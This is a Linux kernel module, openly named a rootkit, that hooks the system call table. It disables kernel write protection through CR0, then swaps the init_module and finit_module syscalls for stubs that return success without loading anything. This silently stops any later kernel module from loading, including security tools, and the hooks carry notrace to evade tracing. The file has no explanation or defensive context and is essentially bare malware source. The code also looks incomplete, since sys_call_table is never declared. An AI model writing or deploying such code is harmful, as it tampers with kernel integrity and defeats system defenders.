#include <linux/module.h> 
#include <linux/kernel.h>
#include <linux/timekeeping.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/dcache.h>
#include <linux/file.h> 
#include <linux/kallsyms.h>
#include <linux/limits.h>
#include <asm/unistd.h>
#include <linux/inet.h>
#include <linux/namei.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <net/sock.h>
#include <linux/string.h>
#include <linux/timekeeping.h>
#include <asm/unistd.h>
#include <linux/tty.h>
#include <linux/mount.h>
#include <linux/fs_struct.h>
#include <linux/path.h> 
#include <linux/signal.h>
#include <linux/sched.h> 
#include <linux/kthread.h> 
#include <linux/delay.h>  
#include <linux/sched/signal.h> 

static asmlinkage long (*orig_init_module)(void __user *umod, unsigned long len, const char __user *uargs);
static asmlinkage long (*orig_finit_module)(int fd, const char __user *uargs, int flags);


notrace asmlinkage long hook_init_module(void __user *umod, unsigned long len, const char __user *uargs) {
    return 0;
}


notrace asmlinkage long hook_finit_module(int fd, const char __user *uargs, int flags) {
    return 0;
}

notrace static int rootkit_init(void)
{
    sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table) {
        return -1;
    }

    write_cr0(read_cr0() & (~0x00010000));
  
    orig_init_module   = (void *) sys_call_table[__NR_init_module];
    orig_finit_module  = (void *) sys_call_table[__NR_finit_module]; 

    sys_call_table[__NR_init_module]  = (unsigned long) hook_init_module;
    sys_call_table[__NR_finit_module] = (unsigned long) hook_finit_module; 

    write_cr0(read_cr0() | 0x00010000);

    return 0;
}

notrace static void rootkit_exit(void)
{

    write_cr0(read_cr0() & (~0x00010000));
  
    sys_call_table[__NR_init_module]  = (unsigned long) orig_init_module;
    sys_call_table[__NR_finit_module] = (unsigned long) orig_finit_module; 

    write_cr0(read_cr0() | 0x00010000);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
